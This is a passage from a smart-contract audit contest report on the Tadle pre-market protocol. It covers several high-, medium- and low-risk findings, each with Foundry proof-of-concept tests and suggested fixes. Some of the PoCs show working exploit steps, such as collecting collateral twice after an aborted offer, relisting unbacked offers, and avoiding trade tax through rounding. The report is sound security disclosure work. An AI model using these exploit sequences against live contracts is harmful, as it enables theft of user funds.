                    offerInfo.offerType,
                    offerInfo.collateralRate,
                    offerInfo.amount,
                    true,
                    Math.Rounding.Floor
                );
            } else {
                uint256 usedAmount = offerInfo.amount.mulDiv(
                    offerInfo.usedPoints,
                    offerInfo.points,
                    Math.Rounding.Floor
                );
                collateralFee = OfferLibraries.getDepositAmount(
                    offerInfo.offerType,
                    offerInfo.collateralRate,
                    usedAmount,
                    true,
                    Math.Rounding.Floor
                );
            }
        }

        uint256 userCollateralFee = collateralFee.mulDiv(
            userRemainingPoints,
            offerInfo.usedPoints,
            Math.Rounding.Floor
        );

        tokenManager.addTokenBalance(
            TokenBalanceType.RemainingCash,
            _msgSender(),
            makerInfo.tokenAddress,
            userCollateralFee
        );
```

This collateral fee includes the original amount the bid taker provided, plus an additional fee calculated based on the collateral rate set by the ask maker. This amount would be paid twice but deposited only once.
## Vulnerability Details
Bid takers would be stealing the amount above the offer amount corresponding to the points bought, i.e., the additional collateral ratio set by the offer maker, since their oiriginal deposit had a unit collateral rate:

$$\text{stolen amount} = \frac{(\text{collateralRate}-1) \cdot \text{userRemainingPoints} \cdot \text{offerInfo.amount}}{\text{offerInfo.usedPoints}}$$

## Impact
Refer to PoC for an example:

```javascript
    function test_bid_taker_closes_aborted_offer() public {
        vm.startPrank(user);

        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                0.01 * 1e18,
                12000,
                300,
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );
        vm.stopPrank();

        vm.startPrank(user1);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);
        address stockAddr = GenerateAddress.generateStockAddress(0);
        address offerAddr = GenerateAddress.generateOfferAddress(0);

        preMarktes.createTaker(offerAddr, 500);
        vm.stopPrank();

        vm.prank(user);
        preMarktes.abortAskOffer(stockAddr, offerAddr);

        address stock1Addr = GenerateAddress.generateStockAddress(1);

        vm.prank(user1);
        // closes aborted offer before settlement period and gets additional 0.2*0.005*1e18 USDC
        deliveryPlace.closeBidTaker(stock1Addr);
        assertEq(
            tokenManager.userTokenBalanceMap(
                user1,
                address(mockUSDCToken),
                TokenBalanceType.RemainingCash
            ),
            (((0.01 * 1e18) / 2) * 12000) / 10000
        );
    }
```
## Tools Used
Manual review.

## Recommendations
Check the abort status of the offer the taker is trying to close in `DeliveryPlace::closeBidTaker`:

```diff
...
        if (makerInfo.offerSettleType == OfferSettleType.Protected) {
            offerInfo = preOfferInfo;
            userRemainingPoints = stockInfo.points;
        } else {
            offerInfo = perMarkets.getOfferInfo(makerInfo.originOffer);
            if (stockInfo.offer == address(0x0)) {
                userRemainingPoints = stockInfo.points;
            } else {
                OfferInfo memory listOfferInfo = perMarkets.getOfferInfo(
                    stockInfo.offer
                );
                userRemainingPoints =
                    listOfferInfo.points -
                    listOfferInfo.usedPoints;
            }
        }
+       if (offerInfo.abortOfferStatus == AbortOfferStatus.Aborted) {
+           revert("Pre offer aborted");
+       }
...
```
## <a id='H-14'></a>H-14. Missing check for aborted origin offer allows bid takers to relist unbacked offers 

_Submitted by [robertodf99](https://profiles.cyfrin.io/u/robertodf99), [fyamf](https://profiles.cyfrin.io/u/fyamf), [0xlamide](https://profiles.cyfrin.io/u/0xlamide), [0xlookman](https://profiles.cyfrin.io/u/0xlookman). Selected submission by: [robertodf99](https://profiles.cyfrin.io/u/robertodf99)._      
            


## Summary

A missing validation check in `PreMarkets::listOffer` allows bid takers to relist aborted stock, which, in an offer operating in turbo mode, results in offers with no collateral backing. Due to another issue, bid takers may be compensated using other users' tokens, as the user relisting the offer faces no penalties.

## Vulnerability Details

If an ask maker chooses to abort their offer, bid takers can also abort their participation by calling `PreMarkets::abortBidTaker`. This returns the tokens originally sent to the ask maker when the offer was created, effectively ending the buy-sell relationship with no further liabilities. However, if the bid taker (now acting as the ask maker) is allowed to relist the offer by calling `PreMarkets::listOffer` while the offer is in turbo mode, a new, unbacked offer is created. This offer lacks any collateral or liability, allowing the bid taker (now the ask maker) to receive tokens from a new taker without having to settle any point tokens. No penalties can be applied since no collateral was locked in the protocol.

## Impact

Refer to the example PoC, where `user` acts as the original maker, `user1` as the first taker who then lists the unbacked offer for sale, and `user2` as the user who takes the unbacked bid offer:

```JavaScript
    function test_relist_aborted_offer() public {
        vm.startPrank(user);

        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                0.01 * 1e18,
                12000,
                300,
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );
        vm.stopPrank();

        vm.startPrank(user1);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);
        address stockAddr = GenerateAddress.generateStockAddress(0);
        address offerAddr = GenerateAddress.generateOfferAddress(0);

        preMarktes.createTaker(offerAddr, 500);
        vm.stopPrank();

        // Abort offers
        vm.prank(user);
        preMarktes.abortAskOffer(stockAddr, offerAddr);
        vm.startPrank(user1);
        address stock1Addr = GenerateAddress.generateStockAddress(1);
        preMarktes.abortBidTaker(stock1Addr, offerAddr);

        // Relist aborted offer and create taker
        preMarktes.listOffer(stock1Addr, 0.01 * 1e18, 12000);
        vm.stopPrank();
        address offer1Addr = GenerateAddress.generateOfferAddress(1);
        vm.prank(user2);
        preMarktes.createTaker(offer1Addr, 500);
        address stock2Addr = GenerateAddress.generateStockAddress(2);

        vm.prank(user1);
        systemConfig.updateMarket(
            "Backpack",
            address(mockPointToken),
            0.01 * 1e18,
            block.timestamp - 1,
            3600
        );
        vm.startPrank(user2);
        deliveryPlace.closeBidTaker(stock2Addr);
        console2.log(
            tokenManager.userTokenBalanceMap(
                user,
                address(mockUSDCToken),
                TokenBalanceType.RemainingCash
            )
        );
        // Capital pool is empty because the offers were previously aborted
        vm.expectRevert(abi.encodeWithSignature("TransferFailed()"));
        tokenManager.withdraw(
            address(mockUSDCToken),
            TokenBalanceType.RemainingCash
        );
    }
```

## Tools Used

Manual review.

## Recommendations

Add missing check in `PreMarkets::listOffer` forcing bid takers to abort their offer if the maker aborted when operating in turbo mode:

```diff
if (makerInfo.offerSettleType == OfferSettleType.Turbo) {
    address originOffer = makerInfo.originOffer;
    OfferInfo memory originOfferInfo = offerInfoMap[originOffer];

+   if (originOfferInfo.abortOfferStatus == AbortOfferStatus.Aborted) {
+       revert("Origin offer aborted");
+   }

    if (_collateralRate != originOfferInfo.collateralRate) {
        revert InvalidCollateralRate();
    }
    originOfferInfo.abortOfferStatus = AbortOfferStatus.SubOfferListed;
}
```

Note that it is not necessary to implement the check for protected offers since bid takers will need to deposit collateral when listing the offer, therefore if they decide to abort, they will still need to provide the point tokens, otherwise their collateral will be sent to the new bid takers.


# Medium Risk Findings

## <a id='M-01'></a>M-01. Unnecessary balance checks and precision issues in TokenManager::_transfer

_Submitted by [justawanderkid](https://profiles.cyfrin.io/u/justawanderkid), [matejdb](https://profiles.cyfrin.io/u/matejdb), [salem](https://profiles.cyfrin.io/u/salem), [boringslav](https://profiles.cyfrin.io/u/boringslav), [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf), [th3l1ghtd3m0n](https://profiles.cyfrin.io/u/th3l1ghtd3m0n), [pandasec](https://profiles.cyfrin.io/u/pandasec), [MSaptarshi007](https://profiles.cyfrin.io/u/MSaptarshi007), [galturok](https://profiles.cyfrin.io/u/galturok), [4rdiii](https://profiles.cyfrin.io/u/4rdiii), [noone7777](https://profiles.cyfrin.io/u/noone7777), [anonimoux2k](https://profiles.cyfrin.io/u/anonimoux2k), [nave765](https://profiles.cyfrin.io/u/nave765), [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [eta](https://profiles.cyfrin.io/u/eta), [mikebello](https://profiles.cyfrin.io/u/mikebello), [oxwhite](https://profiles.cyfrin.io/u/oxwhite), [karanel](https://profiles.cyfrin.io/u/karanel), [y4y](https://profiles.cyfrin.io/u/y4y), [izcoser](https://profiles.cyfrin.io/u/izcoser), [0xnbvc](https://profiles.cyfrin.io/u/0xnbvc), [hlx](https://profiles.cyfrin.io/u/hlx), [0xasp](https://profiles.cyfrin.io/u/0xasp), [joshuajee](https://profiles.cyfrin.io/u/joshuajee), [namx05](https://profiles.cyfrin.io/u/namx05), [robertodf99](https://profiles.cyfrin.io/u/robertodf99), [almantare](https://profiles.cyfrin.io/u/almantare), [jesjupyter](https://profiles.cyfrin.io/u/jesjupyter), [0xgenaudits](https://profiles.cyfrin.io/u/0xgenaudits), [bube](https://profiles.cyfrin.io/u/bube), [0xleadwizard](https://profiles.cyfrin.io/u/0xleadwizard), [praise03](https://profiles.cyfrin.io/u/praise03), [nervouspika](https://profiles.cyfrin.io/u/nervouspika), [pina](https://profiles.cyfrin.io/u/pina), [nikhil20](https://profiles.cyfrin.io/u/nikhil20), [0xbeastboy](https://profiles.cyfrin.io/u/0xbeastboy), [silentwalker](https://profiles.cyfrin.io/u/silentwalker), [dimi6oni](https://profiles.cyfrin.io/u/dimi6oni), [VaRuN](https://profiles.cyfrin.io/u/VaRuN), [Ward](https://codehawks.cyfrin.io/team/clr5ch8nz0001whgxzd0o1ecx), [0xpep7](https://profiles.cyfrin.io/u/0xpep7), [ali9896546](https://profiles.cyfrin.io/u/ali9896546), [flyingbird](https://profiles.cyfrin.io/u/flyingbird), [atharv181](https://profiles.cyfrin.io/u/atharv181), [rbserver](https://profiles.cyfrin.io/u/rbserver), [radin100](https://profiles.cyfrin.io/u/radin100), [0xdemon](https://profiles.cyfrin.io/u/0xdemon), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [0x1912](https://profiles.cyfrin.io/u/0x1912), [0xshoonya](https://profiles.cyfrin.io/u/0xshoonya), [vinica_boy](https://profiles.cyfrin.io/u/vinica_boy), [4eyes](https://codehawks.cyfrin.io/team/clzp933py000dnn0wn5ui2a7b), [zer0](https://profiles.cyfrin.io/u/zer0), [0xrishi](https://profiles.cyfrin.io/u/0xrishi), [456456](https://profiles.cyfrin.io/u/456456), [demorextess](https://profiles.cyfrin.io/u/demorextess), [kupiasec](https://profiles.cyfrin.io/u/kupiasec), [zukanopro](https://profiles.cyfrin.io/u/zukanopro), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [amaron](https://profiles.cyfrin.io/u/amaron), [c0pp3rscr3w3r](https://profiles.cyfrin.io/u/c0pp3rscr3w3r). Selected submission by: [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf)._      
            


## Summary

The `TokenManager::_transfer` function performs unnecessary balance checks before and after the transfer. Additionally, it uses exact equality checks for balance differences, which can cause issues with tokens that have transfer fees or unusual rounding behaviors.

## Vulnerability Details

The `_transfer` function performs balance checks that are typically handled by the ERC20 token itself:

```Solidity
function _transfer(
    address _token,
    address _from,
    address _to,
    uint256 _amount,
    address _capitalPoolAddr
) internal {

    // ...


@>  if (fromBalanceAft != fromBalanceBef - _amount) {
        revert TransferFailed();
    }

@>  if (toBalanceAft != toBalanceBef + _amount) {
		// ...
```

These checks can cause issues with tokens that have transfer fees or non-standard implementations. The test case demonstrates this issue: (to be inserted in `PreMarkets.t.sol`)

```Solidity
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Rescuable} from "../src/utils/Rescuable.sol";

// Mock token contract with a 1% transfer fee
contract MockTokenWithFee is ERC20 {
    constructor() ERC20("MockFeeToken", "MFT") {}

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        uint256 fee = amount / 100; // 1% fee
        uint256 amountAfterFee = amount - fee;
        _transfer(_msgSender(), recipient, amountAfterFee);
        _transfer(_msgSender(), address(this), fee); // Fee goes to the contract
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        uint256 fee = amount / 100; // 1% fee
        uint256 amountAfterFee = amount - fee;
        _transfer(sender, recipient, amountAfterFee);
        _transfer(sender, address(this), fee); // Fee goes to the contract
        uint256 currentAllowance = allowance(sender, _msgSender());
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }
}


function testPrecisionIssue() public {
    // Setup
    uint256 initialBalance = 100 * 10 ** 18; // 100 tokens

    // Deploy a mock token with a 1% transfer fee
    MockTokenWithFee mockToken = new MockTokenWithFee();
    vm.prank(user);
    mockToken.approve(address(tokenManager), initialBalance);

    deal(address(mockToken), address(user), initialBalance);

    // Atempting to "till in" fails
    vm.expectRevert(Rescuable.TransferFailed.selector);
    vm.prank(address(preMarktes));
    tokenManager.tillIn(user, address(mockToken), initialBalance, true);

    // Check balances
    uint256 userBalance = mockToken.balanceOf(user);
    assertEq(
        userBalance,
        initialBalance,
        "User's balance should be the same as the initial balance"
    );

    uint256 userTokenBalance = tokenManager.userTokenBalanceMap(
        user,
        address(mockToken),
        TokenBalanceType.SalesRevenue
    );
    assertEq(
        userTokenBalance,
        0,
        "User's balance in TokenManager should be 0"
    );
    assertEq(
        mockToken.balanceOf(address(capitalPool)),
        0,
        "The balance of the token in the capital pool should be 0"
    );
}
```

## Impact

* Potential for failed transfers when using tokens with transfer fees or non-standard implementations.
* Users may be unable to withdraw their funds if using tokens with transfer fees.
* Users may be unable to send their funds if using tokens with transfer fees.

## Tools Used

Manual Review - Testing

## Recommendations

1. Remove the unnecessary balance checks in the `_transfer` function.
2. Instead of using exact equality checks, implement a tolerance threshold for balance differences to account for potential transfer fees or rounding issues.
3. Consider using OpenZeppelin's SafeERC20 library for safer token transfers.

&#x20;

Here's an example of how the `_transfer` function could be improved:

```diff
function _transfer(
    address _token,
    address _from,
    address _to,
    uint256 _amount,
    address _capitalPoolAddr
) internal {
-	uint256 fromBalanceBef = IERC20(_token).balanceOf(_from);
-   uint256 toBalanceBef = IERC20(_token).balanceOf(_to);
    if (
        _from == _capitalPoolAddr &&
        IERC20(_token).allowance(_from, address(this)) == 0
    ) {
        ICapitalPool(_capitalPoolAddr).approve(address(this));
    }

+   uint256 balanceBefore = IERC20(_token).balanceOf(_to);
    _safe_transfer_from(_token, _from, _to, _amount);
+   uint256 balanceAfter = IERC20(_token).balanceOf(_to);

-   uint256 fromBalanceAft = IERC20(_token).balanceOf(_from);
-   uint256 toBalanceAft = IERC20(_token).balanceOf(_to);

+   uint256 receivedAmount = balanceAfter - balanceBefore;
+   require(receivedAmount > 0, "Transfer failed");
}

```

## <a id='M-02'></a>M-02. `WrappedNativeToken` Can Only Work in `NativeToken` Mode

_Submitted by [auditweiler](https://profiles.cyfrin.io/u/auditweiler), [matejdb](https://profiles.cyfrin.io/u/matejdb), [pandasec](https://profiles.cyfrin.io/u/pandasec), [gajiknownnothing](https://profiles.cyfrin.io/u/gajiknownnothing), [bauchibred](https://profiles.cyfrin.io/u/bauchibred), [jesjupyter](https://profiles.cyfrin.io/u/jesjupyter), [4eyes](https://codehawks.cyfrin.io/team/clzp933py000dnn0wn5ui2a7b), [0xlamide](https://profiles.cyfrin.io/u/0xlamide), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [zer0](https://profiles.cyfrin.io/u/zer0), [kupiasec](https://profiles.cyfrin.io/u/kupiasec). Selected submission by: [jesjupyter](https://profiles.cyfrin.io/u/jesjupyter)._      
            


## Summary

In the `TokenManager::tillIn` function, if `_tokenAddress` is equal to `wrappedNativeToken`, the function directly assumes that a native token is being used and checks `msg.value` for sufficient funds. This approach limits the functionality of `wrappedNativeToken` when it is used as an ERC-20 token, leading to unintended transaction reverts even when the user has approved sufficient funds.

## Vulnerability Details

The `TokenManager::tillIn` function has a conditional check that determines if the `_tokenAddress` is equal to `wrappedNativeToken`. If this condition is met, the function assumes that the transaction involves the native token (e.g., ETH) and checks if `msg.value` is greater than or equal to `_amount`. If `msg.value` is insufficient, the transaction reverts:

```solidity
        if (_tokenAddress == wrappedNativeToken) {
            /**
             * @dev token is native token
             * @notice check msg value
             * @dev if msg value is less than _amount, revert
             * @dev wrap native token and transfer to capital pool
             */
            if (msg.value < _amount) {
                revert Errors.NotEnoughMsgValue(msg.value, _amount);
            }
            IWrappedNativeToken(wrappedNativeToken).deposit{value: _amount}();
            _safe_transfer(wrappedNativeToken, capitalPoolAddr, _amount);
        } 
```

This implementation does not consider cases where `wrappedNativeToken` (e.g., `WETH`) is being used as a regular ERC-20 token in functions like `PreMarkets::createOffer`. In such cases, even if the user has already approved sufficient `WETH`, the transaction would still revert due to the insufficient `msg.value`, causing unintended reverts.

Consider the following case:

1. A user intends to use `wrappedNativeToken` (e.g., `WETH`) directly in `PreMarkets::createOffer`.
2. Despite having approved enough `WETH`, the transaction would still revert because `msg.value` does not match the `_amount` required, leading to an unintended failure.

## Impact

This issue restricts the flexibility of using `wrappedNativeToken` as an ERC-20 token and can lead to unintended transaction failures. Users attempting to interact with the contract using `wrappedNativeToken` which is a normal/frequent case may face unexpected reverts, hindering the user experience and limiting contract functionality.

## Tools Used

Manual

## Recommendations

To address this issue, it is recommended to introduce a separate address that explicitly represents the native token (e.g., `ETH`). For example, the commonly used address `0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee` could be utilized to signify the native token. The condition should then differentiate between `wrappedNativeToken` (used as an ERC-20 token) and the native token (ETH) itself:

## <a id='M-03'></a>M-03. `mulDiv()` can round down to 0 in realistic cases, allowing for tax avoidance

_Submitted by [bengalcatbalu](https://profiles.cyfrin.io/u/bengalcatbalu), [h2134](https://profiles.cyfrin.io/u/h2134), [MSaptarshi007](https://profiles.cyfrin.io/u/MSaptarshi007), [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [ni8mare](https://profiles.cyfrin.io/u/ni8mare), [aresaudits](https://profiles.cyfrin.io/u/aresaudits). Selected submission by: [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful)._      
            


## Summary 📌

The code uses unsafely the `.mulDiv()` function, this function ultimately does: `number*numerator/denominator`. There are realistic scenarios where: `number*numerator < denominator` and the division truncates to 0.

This can ultimately be used to avoid taxes with some tokens or avoid platform fees too. Referral codes can potentially get affected by this too.

***

## Vulnerability Details 🔍 && Impact 📈

Trade tax is calculated like so:

`uint256 tradeTax = depositAmount.mulDiv(makerInfo.eachTradeTax, Constants.EACH_TRADE_TAX_DECIMAL_SCALER);`

Which in math is: `depositAmount * makerInfo.eachTradeTax / Constants.EACH_TRADE_TAX_DECIMAL_SCALER`

`makerInfo.eachTradeTax <= Constants.EACH_TRADE_TAX_DECIMAL_SCALER`. Assuming healthy competitive market taxes will go down to offer better trades so its safe to assume that most of the time `makerInfo.eachTradeTax < Constants.EACH_TRADE_TAX_DECIMAL_SCALER`. Thus the division `makerInfo.eachTradeTax / Constants.EACH_TRADE_TAX_DECIMAL_SCALER` in solidity will round to 0 if `depositAmount` multiplied by `makerInfo.eachTradeTax` is not strong enough to make it `> Constants.EACH_TRADE_TAX_DECIMAL_SCALER` and get the right calculation.

* Numerical Example 👁️:  `EACH_TRADE_TAX_DECIMAL_SCALER==10_000`, see [here](https://github.com/Cyfrin/2024-08-tadle/blob/main/src/libraries/Constants.sol#L14). And lets say a competitive tax of `1% == makerInfo.eachTradeTax == 100`. If `depositAmount < (10000 / 100)` it will round down to 0.

You might notice that for ERC20s with 18 decimals an amount of < 100 is ridiculous and gas cost would be higher than tax savings. But for tokens of <= 2 decimals this is a real problem. As these tokens if used, small purchases from modest clients won't pay taxes. If you payed lets say `3$ == depositAmount == 300`, then `300*100/10000 == 3000/10000 == 3$`. But in solidity `3000/10000` truncates to 0.

A 2 decimal real token example GUSD (Gemini dollar), [see etherscan](https://etherscan.io/address/0x056fd409e1d7a124bd7017459dfea2f387b6d5cd#readContract).

This problem will probably occure in other parts of the code that use `.mulDiv()` to calculate token amounts mulitiplied by some percentage ratio based on the scalars. Like in calculating `platformFee` [here](https://github.com/Cyfrin/2024-08-tadle/blob/main/src/core/PreMarkets.sol#L219). Notice that the scaler here is `1_000_000` so tokens with more than 2 decimals can be problematic too. Like famous and super-used USDC with 6 decimals.

***

## Proof Of Concept (PoC) 👨‍💻💻

Paste this test in the `PreMarkets.t.sol` file, import `import "forge-std/console.sol";`, and run `forge test --mt "test_skipTax" -vv`. You should also ovrride the `decimals()` function in the mock contract used by tests, [this one](https://github.com/Cyfrin/2024-08-tadle/blob/main/test/mocks/MockERC20Token.sol). Like so:

```solidity
  function decimals() public pure override returns (uint8) {
        return 2;
    }
```

<details> <summary> See test code 👁️ </summary>

```solidity
    function test_skipTax() public {
        console.log("-----------------");
        console.log("user -> Alice:  ", address(user));
        console.log("user1 -> Bob:   ", address(user1));
        console.log("-----------------");

        console.log("Alice makes an ask maker offer and bob takes it without paying the tax.");
        console.log(
            "Alice sets a competitive low tax, 1%. Notice that in a competitive enviroment taxes tend to be as low as possible."
        );
        console.log("The lower the tax the greater the amount you can buy skipping it.");

        vm.prank(user);
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                500 * 1e2,
                10_000,
                100,
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );
        address offerAddr = GenerateAddress.generateOfferAddress(0);
        console.log("Bob takes 1 pts for 0.5$, 1% tax is 5 cents = 5");

        vm.startPrank(user1);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);
        preMarktes.createTaker(offerAddr, 1);

        console.log("See Alice balance on tokenManager: ");
        uint256 alceBalance =
            tokenManager.userTokenBalanceMap(address(user), address(mockUSDCToken), TokenBalanceType.TaxIncome);
        console.log("Alice balance Tax Revenue:           ", alceBalance);
        console.log("Alice should have 5 cents as revenue but round down to 0.");
        console.log("Only cost to avoid tax is gas cost, in layer 2 evm compatible where gas is very cheap < tax");
        console.log("You can just multicall and avoid tax.");
    }
```

</details>

***

## Tools Used 🛠️

* Manual review.

***

## Recommendations 🎯

There are multiple approaches to mitigate or even elimiate this issue:

* Reducing the constant scaler to something smaller than `10_000` in Layer2s or blockchains where gas costs are low to make it harder for this skip to be profitable.

* Another approach and the one I recommend the most would be, when an operation carries taxes, detecting if the multiplier `amount * numerator <= denominator` and if so revert saying, minimal amount for avoinding tax evasion is not reached.

> ℹ️ **Note** 📘 There is probably better ways of fixing this, I do not have enough time to get deeper into it. I encourage the devs to do so.

***


# Low Risk Findings

## <a id='L-01'></a>L-01. Rounding Discrepancies in Deposit Amount Calculations

_Submitted by [eta](https://profiles.cyfrin.io/u/eta), [k42](https://profiles.cyfrin.io/u/k42), [Bauer](https://profiles.cyfrin.io/u/Bauer), [eeyore](https://profiles.cyfrin.io/u/eeyore), [thopatevijay](https://profiles.cyfrin.io/u/thopatevijay), [mikebello](https://profiles.cyfrin.io/u/mikebello), [fyamf](https://profiles.cyfrin.io/u/fyamf), [jsmi](https://profiles.cyfrin.io/u/jsmi), [swapnaliss](https://profiles.cyfrin.io/u/swapnaliss), [n3smaro](https://profiles.cyfrin.io/u/n3smaro), [OdeWeb3](https://codehawks.cyfrin.io/team/cluqfw65k000169faytyphjol). Selected submission by: [swapnaliss](https://profiles.cyfrin.io/u/swapnaliss)._      
            


## Vulnerability Details:

In the `_depositTokenWhenCreateTaker` function, rounding inconsistencies can lead to slight inaccuracies in deposit amounts. Specifically, the `getDepositAmount` function utilizes `Math.Rounding.Ceil`, but additional fees are added without aligning with this rounding method.

## Impact:

These inconsistencies may result in users being charged slightly more than required for their deposits. Although each discrepancy might be small, repeated transactions could cause an unfair accumulation of extra funds within the contract.

## proof of Concept:

The following demonstrates the rounding inconsistency:
[Link to code](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L813)

```Solidity
function demonstrateRoundingInconsistency(
    uint256 depositAmount,
    uint256 collateralRate,
    uint256 platformFee,
    uint256 tradeTax
) public pure returns (uint256, uint256) {
    uint256 baseAmount = depositAmount.mulDiv(collateralRate, 10000, Math.Rounding.Ceil);
    uint256 inconsistentTotal = baseAmount + platformFee + tradeTax;
    
    uint256 consistentTotal = (depositAmount + platformFee + tradeTax).mulDiv(collateralRate, 10000, Math.Rounding.Ceil);
    
    return (inconsistentTotal, consistentTotal);
}

// Example:
// demonstrateRoundingInconsistency(10000, 10100, 50, 30)
// Might return (10150, 10151), showing a 1 wei difference
```

## Tools Used

## Recommendations

Ensure consistent rounding throughout the calculations:

```Solidity
uint256 transferAmount = OfferLibraries.getDepositAmount(
    offerInfo.offerType,
    offerInfo.collateralRate,
    depositAmount + platformFee + tradeTax,
    false,
    Math.Rounding.Ceil
);
```

Consider adopting a more precise calculation method to minimize rounding errors.

## <a id='L-02'></a>L-02. [Low-01] Missing Access Control in `CapitalPool::approve()` Function Allows any User to call it to set Allowance Amount `TokenContract` to `type(uint256).max`.

_Submitted by [justawanderkid](https://profiles.cyfrin.io/u/justawanderkid), [0xkrkba](https://profiles.cyfrin.io/u/0xkrkba), [0xreadyplayer1](https://profiles.cyfrin.io/u/0xreadyplayer1), [juan](https://profiles.cyfrin.io/u/juan), [urs28rs1](https://profiles.cyfrin.io/u/urs28rs1), [pelz](https://profiles.cyfrin.io/u/pelz), [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf), [0x40](https://profiles.cyfrin.io/u/0x40), [wttt](https://profiles.cyfrin.io/u/wttt), [kevinkkien](https://profiles.cyfrin.io/u/kevinkkien), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [4gontuk](https://profiles.cyfrin.io/u/4gontuk), [ravikiranweb3](https://profiles.cyfrin.io/u/ravikiranweb3), [pandasec](https://profiles.cyfrin.io/u/pandasec), [0xrolko](https://profiles.cyfrin.io/u/0xrolko), [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r), [v1vah0us3](https://profiles.cyfrin.io/u/v1vah0us3), [fakemonkgin](https://profiles.cyfrin.io/u/fakemonkgin), [darshan](https://profiles.cyfrin.io/u/darshan), [emanherawy](https://profiles.cyfrin.io/u/emanherawy), [guirewire](https://profiles.cyfrin.io/u/guirewire), [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707), [izcoser](https://profiles.cyfrin.io/u/izcoser), [kwakudr](https://profiles.cyfrin.io/u/kwakudr), [administrator](https://profiles.cyfrin.io/u/administrator), [polaris_tow](https://profiles.cyfrin.io/u/polaris_tow), [vladzaev](https://profiles.cyfrin.io/u/vladzaev), [pina](https://profiles.cyfrin.io/u/pina), [kiteweb3](https://profiles.cyfrin.io/u/kiteweb3), [eeyore](https://profiles.cyfrin.io/u/eeyore), [AghaDanial](https://profiles.cyfrin.io/u/AghaDanial), [abdu1918](https://profiles.cyfrin.io/u/abdu1918), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [hlx](https://profiles.cyfrin.io/u/hlx), [karanel](https://profiles.cyfrin.io/u/karanel), [jesjupyter](https://profiles.cyfrin.io/u/jesjupyter), [matejdb](https://profiles.cyfrin.io/u/matejdb), [youleeyan](https://profiles.cyfrin.io/u/youleeyan), [0xdarko](https://profiles.cyfrin.io/u/0xdarko), [abandonedplanetplut](https://profiles.cyfrin.io/u/abandonedplanetplut), [crisscs](https://profiles.cyfrin.io/u/crisscs), [praise03](https://profiles.cyfrin.io/u/praise03), [0xbeastboy](https://profiles.cyfrin.io/u/0xbeastboy), [0xcontrol](https://profiles.cyfrin.io/u/0xcontrol), [waydou](https://profiles.cyfrin.io/u/waydou), [demorextess](https://profiles.cyfrin.io/u/demorextess), [fourb](https://profiles.cyfrin.io/u/fourb), [juggernaut63](https://profiles.cyfrin.io/u/juggernaut63), [tinnohofficial](https://profiles.cyfrin.io/u/tinnohofficial), [kingnull](https://profiles.cyfrin.io/u/kingnull), [fyamf](https://profiles.cyfrin.io/u/fyamf), [nourelden](https://profiles.cyfrin.io/u/nourelden), [sharonphiliplima](https://profiles.cyfrin.io/u/sharonphiliplima), [ivanfitro](https://profiles.cyfrin.io/u/ivanfitro), [tdey](https://profiles.cyfrin.io/u/tdey), [ZeroProtocol](https://profiles.cyfrin.io/u/ZeroProtocol), [dadekuma](https://profiles.cyfrin.io/u/dadekuma), [rio1101](https://profiles.cyfrin.io/u/rio1101), [nervouspika](https://profiles.cyfrin.io/u/nervouspika), [binary](https://profiles.cyfrin.io/u/binary), [air](https://profiles.cyfrin.io/u/air), [nikhil20](https://profiles.cyfrin.io/u/nikhil20), [mikebello](https://profiles.cyfrin.io/u/mikebello), [decap](https://profiles.cyfrin.io/u/decap), [soupy](https://profiles.cyfrin.io/u/soupy), [canbooo](https://profiles.cyfrin.io/u/canbooo), [spomaria](https://profiles.cyfrin.io/u/spomaria), [h2134](https://profiles.cyfrin.io/u/h2134), [AuditorNate](https://profiles.cyfrin.io/u/AuditorNate), [cheatcode](https://profiles.cyfrin.io/u/cheatcode), [0xshadow1](https://profiles.cyfrin.io/u/0xshadow1), [shahilhussain](https://profiles.cyfrin.io/u/shahilhussain), [flyingbird](https://profiles.cyfrin.io/u/flyingbird), [rea](https://profiles.cyfrin.io/u/rea), [0xsecuri](https://profiles.cyfrin.io/u/0xsecuri), [StraawHaat](https://profiles.cyfrin.io/u/StraawHaat), [ro1sharkm](https://profiles.cyfrin.io/u/ro1sharkm), [Ward](https://codehawks.cyfrin.io/team/clr5ch8nz0001whgxzd0o1ecx), [chaossr](https://profiles.cyfrin.io/u/chaossr), [0xshoonya](https://profiles.cyfrin.io/u/0xshoonya), [0xMilenov](https://profiles.cyfrin.io/u/0xMilenov), [gululu](https://profiles.cyfrin.io/u/gululu), [aresaudits](https://profiles.cyfrin.io/u/aresaudits), [mansa11](https://profiles.cyfrin.io/u/mansa11), [nilay27](https://profiles.cyfrin.io/u/nilay27), [bareli](https://profiles.cyfrin.io/u/bareli), 